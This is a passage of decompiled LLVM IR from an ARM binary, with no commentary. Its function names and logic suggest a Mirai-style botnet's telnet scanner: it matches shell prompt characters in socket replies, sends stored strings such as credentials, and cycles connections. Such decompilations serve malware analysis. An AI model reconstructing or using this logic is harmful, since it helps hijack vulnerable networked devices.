  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e664 = icmp eq i8 %v4_e660, 0
  store i1 %v2_e664, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e664, label %bb386, label %.thread63

bb386:                                            ; preds = %dec_label_pc_e660
  %v2_e668 = add nuw nsw i32 %v6_e660, 65
  store i32 %v2_e668, i32* %r3.global-to-local, align 4
  %v2_e66c = trunc i32 %v2_e668 to i8
  store i8 %v2_e66c, i8* %v3_e660, align 1
  %v0_e670.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread63

.thread63:                                        ; preds = %dec_label_pc_e660, %bb386
  %v0_e670 = phi i32 [ %v3_e66c, %dec_label_pc_e660 ], [ %v0_e670.pre, %bb386 ]
  %v1_e670 = add i32 %v0_e670, 1
  store i32 %v1_e670, i32* %r2.global-to-local, align 4
  %v3_e674 = icmp uge i32 %v1_e670, %v4_e650
  store i1 %v3_e674, i1* %cpsr_c.global-to-local, align 1
  %v9_e674 = icmp eq i32 %v1_e670, %v4_e650
  store i1 %v9_e674, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e674, label %dec_label_pc_e67c, label %dec_label_pc_e660

dec_label_pc_e67c:                                ; preds = %.thread63, %dec_label_pc_e6d0
  store i32 ptrtoint (i32* @global_var_20f64.119 to i32), i32* @ip, align 4
  %v0_e680 = load i32, i32* @r5, align 4
  %v1_e680 = add i32 %v0_e680, 24
  %v2_e680 = inttoptr i32 %v1_e680 to i32*
  %v3_e680 = load i32, i32* %v2_e680, align 4
  %v2_e684 = load i32, i32* @global_var_20f64.119, align 4
  store i32 %v2_e684, i32* %r2.global-to-local, align 4
  %v2_e688 = add i32 %v3_e680, %v4_e650
  store i32 %v2_e688, i32* %r3.global-to-local, align 4
  store i32 %v2_e688, i32* %v2_e680, align 4
  %v0_e690 = load i32, i32* %r2.global-to-local, align 4
  %v1_e690 = load i32, i32* @r5, align 4
  %v2_e690 = add i32 %v1_e690, 8
  %v3_e690 = inttoptr i32 %v2_e690 to i32*
  store i32 %v0_e690, i32* %v3_e690, align 4
  br label %dec_label_pc_e694

dec_label_pc_e694:                                ; preds = %dec_label_pc_e7b4, %dec_label_pc_e67c
  %v0_e694 = load i32, i32* @r5, align 4
  %v1_e694 = add i32 %v0_e694, 12
  %v2_e694 = inttoptr i32 %v1_e694 to i32*
  %v3_e694 = load i32, i32* %v2_e694, align 4
  store i32 %v3_e694, i32* %r0.global-to-local, align 4
  %v1_e698 = add i32 %v3_e694, -2
  store i32 %v1_e698, i32* @r3, align 4
  %v7_e69c = icmp eq i32 %v1_e698, 8
  store i1 %v7_e69c, i1* %cpsr_z.global-to-local, align 1
  %v5_e6a0 = and i32 %v1_e698, 1073741824
  %v6_e6a0 = icmp ne i32 %v5_e6a0, 0
  store i1 %v6_e6a0, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_e694, label %dec_label_pc_e618.backedge [
    i32 2, label %dec_label_pc_edec
    i32 3, label %dec_label_pc_ec00
    i32 4, label %dec_label_pc_ecf8
    i32 5, label %dec_label_pc_eb2c
    i32 6, label %dec_label_pc_e984
    i32 7, label %dec_label_pc_e8b0
    i32 8, label %dec_label_pc_ea58
    i32 9, label %dec_label_pc_e7dc
    i32 10, label %dec_label_pc_e738
  ]

dec_label_pc_e6cc:                                ; preds = %dec_label_pc_e630
  br i1 %v2_e654, label %dec_label_pc_f25c, label %dec_label_pc_e6d0

dec_label_pc_e6d0:                                ; preds = %dec_label_pc_e6cc
  %v3_e6d0 = icmp eq i32 %v4_e650, -1
  store i1 %v3_e6d0, i1* %cpsr_c.global-to-local, align 1
  %v8_e6d0 = icmp eq i32 %v4_e650, -1
  store i1 %v8_e6d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e6d0, label %dec_label_pc_e6d8, label %dec_label_pc_e67c

dec_label_pc_e6d8:                                ; preds = %dec_label_pc_e6d0
  %v0_e6d8 = load i32, i32* @sb, align 4
  %v1_e6d8 = inttoptr i32 %v0_e6d8 to i32*
  %v2_e6d8 = load i32, i32* %v1_e6d8, align 4
  store i32 %v2_e6d8, i32* %r3.global-to-local, align 4
  %v2_e6dc = icmp ugt i32 %v2_e6d8, 10
  store i1 %v2_e6dc, i1* %cpsr_c.global-to-local, align 1
  %v7_e6dc = icmp eq i32 %v2_e6d8, 11
  store i1 %v7_e6dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e6dc, label %dec_label_pc_e720, label %dec_label_pc_e6e4

dec_label_pc_e6e4:                                ; preds = %dec_label_pc_e6d8, %dec_label_pc_f25c
  %v0_e6e4 = load i32, i32* @r5, align 4
  %v1_e6e4 = add i32 %v0_e6e4, 4
  %v2_e6e4 = inttoptr i32 %v1_e6e4 to i32*
  %v3_e6e4 = load i32, i32* %v2_e6e4, align 4
  store i32 %v3_e6e4, i32* %r0.global-to-local, align 4
  %v1_e6e8 = call i32 @__GI___libc_close(i32 %v3_e6e4)
  store i32 %v1_e6e8, i32* %r0.global-to-local, align 4
  %v0_e6ec = load i32, i32* @r5, align 4
  %v1_e6ec = add i32 %v0_e6ec, 284
  %v2_e6ec = inttoptr i32 %v1_e6ec to i8*
  %v3_e6ec = load i8, i8* %v2_e6ec, align 1
  %v4_e6ec = zext i8 %v3_e6ec to i32
  %v1_e6f0 = add nuw nsw i32 %v4_e6ec, 1
  %v1_e6f4 = urem i32 %v1_e6f0, 256
  store i32 %v1_e6f4, i32* %r3.global-to-local, align 4
  %v2_e6f8 = icmp ugt i32 %v1_e6f4, 8
  store i1 %v2_e6f8, i1* %cpsr_c.global-to-local, align 1
  %v7_e6f8 = icmp eq i32 %v1_e6f4, 9
  store i1 %v7_e6f8, i1* %cpsr_z.global-to-local, align 1
  %v1_e6fc = trunc i32 %v1_e6f0 to i8
  store i8 %v1_e6fc, i8* %v2_e6ec, align 1
  %v0_e700 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_e700 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_e700 = xor i1 %v1_e700, true
  %v3_e700 = and i1 %v0_e700, %v2_e700
  br i1 %v3_e700, label %bb387, label %.thread293

.thread293:                                       ; preds = %dec_label_pc_e6e4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v1_e70c289294 = load i32, i32* @r5, align 4
  %v2_e70c290295 = add i32 %v1_e70c289294, 4
  %v3_e70c291296 = inttoptr i32 %v2_e70c290295 to i32*
  store i32 -1, i32* %v3_e70c291296, align 4
  br label %bb388

bb387:                                            ; preds = %dec_label_pc_e6e4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_e70c285 = load i32, i32* @r5, align 4
  %v2_e70c286 = add i32 %v1_e70c285, 4
  %v3_e70c287 = inttoptr i32 %v2_e70c286 to i32*
  store i32 -1, i32* %v3_e70c287, align 4
  %v4_e710 = load i32, i32* %r0.global-to-local, align 4
  %v5_e710 = load i32, i32* @r5, align 4
  %v6_e710 = add i32 %v5_e710, 12
  %v7_e710 = inttoptr i32 %v6_e710 to i32*
  store i32 %v4_e710, i32* %v7_e710, align 4
  %v4_e714 = load i32, i32* %r3.global-to-local, align 4
  %v5_e714 = trunc i32 %v4_e714 to i8
  %v6_e714 = load i32, i32* @r5, align 4
  %v7_e714 = add i32 %v6_e714, 284
  %v8_e714 = inttoptr i32 %v7_e714 to i8*
  store i8 %v5_e714, i8* %v8_e714, align 1
  %v0_e718.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_e718.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb388

bb388:                                            ; preds = %.thread293, %bb387
  %v1_e71c = phi i1 [ %v1_e718.pre, %bb387 ], [ %v0_e700, %.thread293 ]
  %v0_e71c = phi i1 [ %v0_e718.pre, %bb387 ], [ %v1_e700, %.thread293 ]
  %v2_e718 = xor i1 %v1_e71c, true
  %v3_e718 = or i1 %v0_e71c, %v2_e718
  br i1 %v3_e718, label %bb389, label %bb390

bb389:                                            ; preds = %bb388
  %v4_e718 = load i32, i32* @r5, align 4
  store i32 %v4_e718, i32* %r0.global-to-local, align 4
  br label %bb390

bb390:                                            ; preds = %bb388, %bb389
  store i32 59168, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_e718, i32 ptrtoint (i32* @global_var_ccd4.496 to i32))
  br label %dec_label_pc_e720

dec_label_pc_e720:                                ; preds = %dec_label_pc_e614.loopexit, %dec_label_pc_e618.backedge, %dec_label_pc_e614.preheader, %dec_label_pc_e6d8, %dec_label_pc_e5f8, %dec_label_pc_e5ac, %dec_label_pc_f180, %bb390
  %v3_e720 = load i16, i16* %stack_var_-52, align 2
  %v4_e720 = sext i16 %v3_e720 to i32
  store i32 %v4_e720, i32* %r3.global-to-local, align 4
  %v1_e724 = add nsw i32 %v4_e720, 1
  store i32 %v1_e724, i32* @r4, align 4
  %v2_e728 = icmp ugt i32 %v1_e724, 254
  store i1 %v2_e728, i1* %cpsr_c.global-to-local, align 1
  %v7_e728 = icmp eq i32 %v1_e724, 255
  store i1 %v7_e728, i1* %cpsr_z.global-to-local, align 1
  %v5_e72c = trunc i32 %v1_e724 to i16
  store i16 %v5_e72c, i16* %stack_var_-52, align 2
  %v7_e730 = icmp sgt i16 %v3_e720, 254
  br i1 %v7_e730, label %dec_label_pc_dfe0, label %dec_label_pc_e5ac

dec_label_pc_e738:                                ; preds = %dec_label_pc_e694
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_e73c = call i32 @table_unlock_val(i32 10)
  store i32 %v2_eca4, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v3_e74c = call i32 @table_retrieve_val(i32 10, i32* %v2_ecac)
  %v3_e750 = load i8, i8* %stack_var_-56, align 1
  %v4_e750 = sext i8 %v3_e750 to i32
  store i32 %v3_e74c, i32* %r2.global-to-local, align 4
  %v1_e758 = add nsw i32 %v4_e750, -1
  store i32 %v1_e758, i32* %r3.global-to-local, align 4
  %v0_e75c = load i32, i32* @sl, align 4
  store i32 %v0_e75c, i32* %r0.global-to-local, align 4
  %v0_e760 = load i32, i32* @r5, align 4
  %v1_e760 = add i32 %v0_e760, 24
  %v2_e760 = inttoptr i32 %v1_e760 to i32*
  %v3_e760 = load i32, i32* %v2_e760, align 4
  store i32 %v3_e760, i32* %r1.global-to-local, align 4
  %v4_e764 = call i32 @util_memsearch(i32 %v0_e75c, i32 %v3_e760, i32 %v3_e74c, i32 %v1_e758)
  %v2_e768 = icmp eq i32 %v4_e764, -1
  store i1 %v2_e768, i1* %cpsr_c.global-to-local, align 1
  %v7_e768 = icmp eq i32 %v4_e764, -1
  store i1 %v7_e768, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_e764, i32* @r4, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_ef74 = call i32 @table_lock_val(i32 10)
  br i1 %v7_e768, label %dec_label_pc_ef70, label %dec_label_pc_e774

dec_label_pc_e774:                                ; preds = %dec_label_pc_e738
  store i32 %v1_ef74, i32* %r0.global-to-local, align 4
  %v0_e77c = load i32, i32* @r5, align 4
  %v1_e77c = add i32 %v0_e77c, 4
  %v2_e77c = inttoptr i32 %v1_e77c to i32*
  %v3_e77c = load i32, i32* %v2_e77c, align 4
  store i32 %v3_e77c, i32* %r0.global-to-local, align 4
  %v1_e780 = call i32 @__GI___libc_close(i32 %v3_e77c)
  store i32 %v1_e780, i32* %r0.global-to-local, align 4
  %v0_e784 = load i32, i32* @r5, align 4
  %v1_e784 = add i32 %v0_e784, 284
  %v2_e784 = inttoptr i32 %v1_e784 to i8*
  %v3_e784 = load i8, i8* %v2_e784, align 1
  %v4_e784 = zext i8 %v3_e784 to i32
  %v1_e788 = add nuw nsw i32 %v4_e784, 1
  %v1_e78c = urem i32 %v1_e788, 256
  store i32 %v1_e78c, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_e794 = icmp ugt i32 %v1_e78c, 9
  store i1 %v2_e794, i1* %cpsr_c.global-to-local, align 1
  %v7_e794 = icmp eq i32 %v1_e78c, 10
  store i1 %v7_e794, i1* %cpsr_z.global-to-local, align 1
  %v2_e798 = add i32 %v0_e784, 4
  %v3_e798 = inttoptr i32 %v2_e798 to i32*
  store i32 -1, i32* %v3_e798, align 4
  %v0_e79c = load i32, i32* @r3, align 4
  %v1_e79c = trunc i32 %v0_e79c to i8
  %v2_e79c = load i32, i32* @r5, align 4
  %v3_e79c = add i32 %v2_e79c, 284
  %v4_e79c = inttoptr i32 %v3_e79c to i8*
  store i8 %v1_e79c, i8* %v4_e79c, align 1
  %v0_e7a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e7a0, label %dec_label_pc_e7a4, label %dec_label_pc_f064

dec_label_pc_e7a4:                                ; preds = %dec_label_pc_e774
  store i32 0, i32* @r3, align 4
  %v1_e7a8 = load i32, i32* @r5, align 4
  %v2_e7a8 = add i32 %v1_e7a8, 12
  %v3_e7a8 = inttoptr i32 %v2_e7a8 to i32*
  store i32 0, i32* %v3_e7a8, align 4
  %v0_e7ac = load i32, i32* @r3, align 4
  %v1_e7ac = trunc i32 %v0_e7ac to i8
  %v2_e7ac = load i32, i32* @r5, align 4
  %v3_e7ac = add i32 %v2_e7ac, 284
  %v4_e7ac = inttoptr i32 %v3_e7ac to i8*
  store i8 %v1_e7ac, i8* %v4_e7ac, align 1
  br label %dec_label_pc_e7b0

dec_label_pc_e7b0:                                ; preds = %dec_label_pc_f064, %dec_label_pc_e7a4
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_e7b4

dec_label_pc_e7b4:                                ; preds = %dec_label_pc_ede0, %dec_label_pc_eba8, %dec_label_pc_ead4, %dec_label_pc_ea00, %dec_label_pc_e92c, %dec_label_pc_e858, %dec_label_pc_e7b0
  %v0_e7b4 = load i32, i32* @r5, align 4
  %v1_e7b4 = add i32 %v0_e7b4, 24
  %v2_e7b4 = inttoptr i32 %v1_e7b4 to i32*
  %v3_e7b4 = load i32, i32* %v2_e7b4, align 4
  %v0_e7b8 = load i32, i32* @r7, align 4
  %v2_e7b8 = sub i32 %v0_e7b8, %v3_e7b4
  %v3_e7b8 = icmp uge i32 %v0_e7b8, %v3_e7b4
  store i1 %v3_e7b8, i1* %cpsr_c.global-to-local, align 1
  %v4_e7b8 = xor i32 %v0_e7b8, %v3_e7b4
  %v5_e7b8 = xor i32 %v2_e7b8, %v0_e7b8
  %v6_e7b8 = and i32 %v5_e7b8, %v4_e7b8
  %v7_e7b8 = icmp slt i32 %v6_e7b8, 0
  %v8_e7b8 = icmp slt i32 %v2_e7b8, 0
  %v9_e7b8 = icmp eq i32 %v0_e7b8, %v3_e7b4
  store i1 %v9_e7b8, i1* %cpsr_z.global-to-local, align 1
  %v2_e7bc = xor i1 %v8_e7b8, %v7_e7b8
  %v0_e7b8.v3_e7b4 = select i1 %v2_e7bc, i32 %v0_e7b8, i32 %v3_e7b4
  store i32 %v0_e7b8.v3_e7b4, i32* %r1.global-to-local, align 4
  %v2_e7c4 = sub i32 %v3_e7b4, %v0_e7b8.v3_e7b4
  store i32 %v2_e7c4, i32* @r2, align 4
  store i32 %v2_e7c4, i32* %v2_e7b4, align 4
  %v0_e7cc = load i32, i32* @sl, align 4
  %v1_e7cc = load i32, i32* %r1.global-to-local, align 4
  %v2_e7cc = add i32 %v1_e7cc, %v0_e7cc
  store i32 %v2_e7cc, i32* @r1, align 4
  store i32 %v0_e7cc, i32* @r0, align 4
  %v3_e7d4 = call i32 @memmove(i32 %v0_e7cc, i32 %v2_e7cc, i32 %v2_e7c4)
  store i32 %v3_e7d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e694

dec_label_pc_e7dc:                                ; preds = %dec_label_pc_e694
  %v1_e7dc = add i32 %v0_e694, 24
  %v2_e7dc = inttoptr i32 %v1_e7dc to i32*
  %v3_e7dc = load i32, i32* %v2_e7dc, align 4
  store i32 %v3_e7dc, i32* %r2.global-to-local, align 4
  %v1_e7e0 = add i32 %v3_e7dc, -1
  store i32 %v1_e7e0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e7e4 = icmp eq i32 %v1_e7e0, 0
  store i1 %v2_e7e4, i1* %cpsr_z.global-to-local, align 1
  %tmp393 = icmp slt i32 %v1_e7e0, 1
  br i1 %tmp393, label %dec_label_pc_e618.backedge.thread, label %dec_label_pc_e7ec

dec_label_pc_e7ec:                                ; preds = %dec_label_pc_e7dc
  %v2_e7ec = add i32 %v1_e7e0, %v0_e694
  store i32 %v2_e7ec, i32* %r3.global-to-local, align 4
  %v1_e7f0 = add i32 %v2_e7ec, 28
  %v2_e7f0 = inttoptr i32 %v1_e7f0 to i8*
  %v3_e7f0 = load i8, i8* %v2_e7f0, align 1
  %v4_e7f0 = zext i8 %v3_e7f0 to i32
  store i32 %v4_e7f0, i32* %r3.global-to-local, align 4
  %v2_e7f4 = icmp ugt i8 %v3_e7f0, 61
  store i1 %v2_e7f4, i1* %cpsr_c.global-to-local, align 1
  %v7_e7f4 = icmp eq i8 %v3_e7f0, 62
  store i1 %v7_e7f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e7f4, label %dec_label_pc_e858, label %bb394

bb394:                                            ; preds = %dec_label_pc_e7ec
  %v3_e7f8 = icmp ugt i8 %v3_e7f0, 57
  store i1 %v3_e7f8, i1* %cpsr_c.global-to-local, align 1
  %v8_e7f8 = icmp eq i8 %v3_e7f0, 58
  store i1 %v8_e7f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e7f8, label %dec_label_pc_e858, label %dec_label_pc_e800

dec_label_pc_e800:                                ; preds = %bb394
  %v2_e800 = icmp ugt i8 %v3_e7f0, 35
  store i1 %v2_e800, i1* %cpsr_c.global-to-local, align 1
  %v7_e800 = icmp eq i8 %v3_e7f0, 36
  store i1 %v7_e800, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e800, label %dec_label_pc_e858, label %dec_label_pc_e808

dec_label_pc_e808:                                ; preds = %dec_label_pc_e800
  %v2_e808 = icmp ugt i8 %v3_e7f0, 34
  store i1 %v2_e808, i1* %cpsr_c.global-to-local, align 1
  %v7_e808 = icmp eq i8 %v3_e7f0, 35
  store i1 %v7_e808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e808, label %dec_label_pc_e858, label %dec_label_pc_e810

dec_label_pc_e810:                                ; preds = %dec_label_pc_e808
  %v2_e810 = icmp ugt i8 %v3_e7f0, 36
  store i1 %v2_e810, i1* %cpsr_c.global-to-local, align 1
  %v7_e810 = icmp eq i8 %v3_e7f0, 37
  store i1 %v7_e810, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e810, label %dec_label_pc_e858, label %dec_label_pc_e840.preheader

dec_label_pc_e840.preheader:                      ; preds = %dec_label_pc_e810
  %v3_e814 = add i32 %v0_e694, 28
  %v2_e818 = add i32 %v3_e814, %v3_e7dc
  store i32 %v2_e818, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e840

dec_label_pc_e824:                                ; preds = %bb395
  %v2_e824 = icmp ugt i8 %v3_e848, 35
  store i1 %v2_e824, i1* %cpsr_c.global-to-local, align 1
  %v7_e824 = icmp eq i8 %v3_e848, 36
  store i1 %v7_e824, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e824, label %dec_label_pc_e858, label %dec_label_pc_e82c

dec_label_pc_e82c:                                ; preds = %dec_label_pc_e824
  %v2_e82c = icmp ugt i8 %v3_e848, 34
  store i1 %v2_e82c, i1* %cpsr_c.global-to-local, align 1
  %v7_e82c = icmp eq i8 %v3_e848, 35
  store i1 %v7_e82c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e82c, label %dec_label_pc_e858, label %dec_label_pc_e834

dec_label_pc_e834:                                ; preds = %dec_label_pc_e82c
  %v2_e834 = icmp ugt i8 %v3_e848, 36
  store i1 %v2_e834, i1* %cpsr_c.global-to-local, align 1
  %v7_e834 = icmp eq i8 %v3_e848, 37
  store i1 %v7_e834, i1* %cpsr_z.global-to-local, align 1
  %v1_e838 = add i32 %v0_e838, -1
  store i32 %v1_e838, i32* %r3.global-to-local, align 4
  br i1 %v7_e834, label %dec_label_pc_e858, label %dec_label_pc_e840

dec_label_pc_e840:                                ; preds = %dec_label_pc_e840.preheader, %dec_label_pc_e834
  %v0_e838 = phi i32 [ %v2_e818, %dec_label_pc_e840.preheader ], [ %v1_e838, %dec_label_pc_e834 ]
  %v0_e840 = phi i32 [ %v1_e7e0, %dec_label_pc_e840.preheader ], [ %v1_e840, %dec_label_pc_e834 ]
  %v1_e840 = add i32 %v0_e840, -1
  store i32 %v1_e840, i32* %r1.global-to-local, align 4
  %v2_e840 = icmp ne i32 %v0_e840, 0
  store i1 %v2_e840, i1* %cpsr_c.global-to-local, align 1
  %v7_e840 = icmp eq i32 %v0_e840, 1
  store i1 %v7_e840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e840, label %dec_label_pc_e618.backedge.thread528, label %dec_label_pc_e848

dec_label_pc_e848:                                ; preds = %dec_label_pc_e840
  %v1_e848 = add i32 %v0_e838, -2
  %v2_e848 = inttoptr i32 %v1_e848 to i8*
  %v3_e848 = load i8, i8* %v2_e848, align 1
  %v4_e848 = zext i8 %v3_e848 to i32
  store i32 %v4_e848, i32* %r2.global-to-local, align 4
  %v2_e84c = icmp ugt i8 %v3_e848, 61
  store i1 %v2_e84c, i1* %cpsr_c.global-to-local, align 1
  %v7_e84c = icmp eq i8 %v3_e848, 62
  store i1 %v7_e84c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e84c, label %dec_label_pc_e858, label %bb395

bb395:                                            ; preds = %dec_label_pc_e848
  %v3_e850 = icmp ugt i8 %v3_e848, 57
  store i1 %v3_e850, i1* %cpsr_c.global-to-local, align 1
  %v8_e850 = icmp eq i8 %v3_e848, 58
  store i1 %v8_e850, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e850, label %dec_label_pc_e858, label %dec_label_pc_e824

dec_label_pc_e858:                                ; preds = %dec_label_pc_e848, %bb395, %dec_label_pc_e834, %dec_label_pc_e82c, %dec_label_pc_e824, %dec_label_pc_e810, %dec_label_pc_e7ec, %dec_label_pc_e808, %dec_label_pc_e800, %bb394
  %v0_e85c = phi i32 [ %v1_e7e0, %dec_label_pc_e810 ], [ %v1_e7e0, %dec_label_pc_e7ec ], [ %v1_e7e0, %dec_label_pc_e808 ], [ %v1_e7e0, %dec_label_pc_e800 ], [ %v1_e7e0, %bb394 ], [ %v1_e840, %dec_label_pc_e824 ], [ %v1_e840, %dec_label_pc_e82c ], [ %v1_e840, %dec_label_pc_e834 ], [ %v1_e840, %bb395 ], [ %v1_e840, %dec_label_pc_e848 ]
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_e85c = add i32 %v0_e85c, 1
  store i32 %v1_e85c, i32* @r7, align 4
  %v1_e860 = call i32 @table_unlock_val(i32 8)
  store i32 %v2_ec90, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v3_e870 = call i32 @table_retrieve_val(i32 8, i32* nonnull %stack_var_-60)
  store i32 %v3_e870, i32* %r0.global-to-local, align 4
  %v3_e874 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_e874, i32* %r2.global-to-local, align 4
  store i32 %v3_e870, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e880 = load i32, i32* @r5, align 4
  %v1_e880 = add i32 %v0_e880, 4
  %v2_e880 = inttoptr i32 %v1_e880 to i32*
  %v3_e880 = load i32, i32* %v2_e880, align 4
  store i32 %v3_e880, i32* %r0.global-to-local, align 4
  %v4_e884 = call i32 @__libc_send(i32 %v3_e880, i32 %v3_e870, i32 %v3_e874, i32 16384)
  store i32 %v4_e884, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_186cc.498 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e894 = load i32, i32* @r5, align 4
  %v1_e894 = add i32 %v0_e894, 4
  %v2_e894 = inttoptr i32 %v1_e894 to i32*
  %v3_e894 = load i32, i32* %v2_e894, align 4
  store i32 %v3_e894, i32* %r0.global-to-local, align 4
  %v4_e898 = call i32 @__libc_send(i32 %v3_e894, i32 ptrtoint ([3 x i8]* @global_var_186cc.498 to i32), i32 2, i32 16384)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_e8a0 = call i32 @table_lock_val(i32 8)
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_e8a8 = load i32, i32* @r5, align 4
  %v2_e8a8 = add i32 %v1_e8a8, 12
  %v3_e8a8 = inttoptr i32 %v2_e8a8 to i32*
  store i32 10, i32* %v3_e8a8, align 4
  br label %dec_label_pc_e7b4

dec_label_pc_e8b0:                                ; preds = %dec_label_pc_e694
  %v1_e8b0 = add i32 %v0_e694, 24
  %v2_e8b0 = inttoptr i32 %v1_e8b0 to i32*
  %v3_e8b0 = load i32, i32* %v2_e8b0, align 4
  store i32 %v3_e8b0, i32* %r2.global-to-local, align 4
  %v1_e8b4 = add i32 %v3_e8b0, -1
  store i32 %v1_e8b4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e8b8 = icmp eq i32 %v1_e8b4, 0
  store i1 %v2_e8b8, i1* %cpsr_z.global-to-local, align 1
  %tmp396 = icmp slt i32 %v1_e8b4, 1
  br i1 %tmp396, label %dec_label_pc_e618.backedge.thread, label %dec_label_pc_e8c0

dec_label_pc_e8c0:                                ; preds = %dec_label_pc_e8b0
  %v2_e8c0 = add i32 %v1_e8b4, %v0_e694
  store i32 %v2_e8c0, i32* %r3.global-to-local, align 4
  %v1_e8c4 = add i32 %v2_e8c0, 28
  %v2_e8c4 = inttoptr i32 %v1_e8c4 to i8*
  %v3_e8c4 = load i8, i8* %v2_e8c4, align 1
  %v4_e8c4 = zext i8 %v3_e8c4 to i32
  store i32 %v4_e8c4, i32* %r3.global-to-local, align 4
  %v2_e8c8 = icmp ugt i8 %v3_e8c4, 61
  store i1 %v2_e8c8, i1* %cpsr_c.global-to-local, align 1
  %v7_e8c8 = icmp eq i8 %v3_e8c4, 62
  store i1 %v7_e8c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8c8, label %dec_label_pc_e92c, label %bb397

bb397:                                            ; preds = %dec_label_pc_e8c0
  %v3_e8cc = icmp ugt i8 %v3_e8c4, 57
  store i1 %v3_e8cc, i1* %cpsr_c.global-to-local, align 1
  %v8_e8cc = icmp eq i8 %v3_e8c4, 58
  store i1 %v8_e8cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e8cc, label %dec_label_pc_e92c, label %dec_label_pc_e8d4

dec_label_pc_e8d4:                                ; preds = %bb397
  %v2_e8d4 = icmp ugt i8 %v3_e8c4, 35
  store i1 %v2_e8d4, i1* %cpsr_c.global-to-local, align 1
  %v7_e8d4 = icmp eq i8 %v3_e8c4, 36
  store i1 %v7_e8d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8d4, label %dec_label_pc_e92c, label %dec_label_pc_e8dc

dec_label_pc_e8dc:                                ; preds = %dec_label_pc_e8d4
  %v2_e8dc = icmp ugt i8 %v3_e8c4, 34
  store i1 %v2_e8dc, i1* %cpsr_c.global-to-local, align 1
  %v7_e8dc = icmp eq i8 %v3_e8c4, 35
  store i1 %v7_e8dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8dc, label %dec_label_pc_e92c, label %dec_label_pc_e8e4

dec_label_pc_e8e4:                                ; preds = %dec_label_pc_e8dc
  %v2_e8e4 = icmp ugt i8 %v3_e8c4, 36
  store i1 %v2_e8e4, i1* %cpsr_c.global-to-local, align 1
  %v7_e8e4 = icmp eq i8 %v3_e8c4, 37
  store i1 %v7_e8e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8e4, label %dec_label_pc_e92c, label %dec_label_pc_e914.preheader

dec_label_pc_e914.preheader:                      ; preds = %dec_label_pc_e8e4
  %v3_e8e8 = add i32 %v0_e694, 28
  %v2_e8ec = add i32 %v3_e8e8, %v3_e8b0
  store i32 %v2_e8ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e914

dec_label_pc_e8f8:                                ; preds = %bb398
  %v2_e8f8 = icmp ugt i8 %v3_e91c, 35
  store i1 %v2_e8f8, i1* %cpsr_c.global-to-local, align 1
  %v7_e8f8 = icmp eq i8 %v3_e91c, 36
  store i1 %v7_e8f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8f8, label %dec_label_pc_e92c, label %dec_label_pc_e900

dec_label_pc_e900:                                ; preds = %dec_label_pc_e8f8
  %v2_e900 = icmp ugt i8 %v3_e91c, 34
  store i1 %v2_e900, i1* %cpsr_c.global-to-local, align 1
  %v7_e900 = icmp eq i8 %v3_e91c, 35
  store i1 %v7_e900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e900, label %dec_label_pc_e92c, label %dec_label_pc_e908

dec_label_pc_e908:                                ; preds = %dec_label_pc_e900
  %v2_e908 = icmp ugt i8 %v3_e91c, 36
  store i1 %v2_e908, i1* %cpsr_c.global-to-local, align 1
  %v7_e908 = icmp eq i8 %v3_e91c, 37
  store i1 %v7_e908, i1* %cpsr_z.global-to-local, align 1
  %v1_e90c = add i32 %v0_e90c, -1
  store i32 %v1_e90c, i32* %r3.global-to-local, align 4
  br i1 %v7_e908, label %dec_label_pc_e92c, label %dec_label_pc_e914

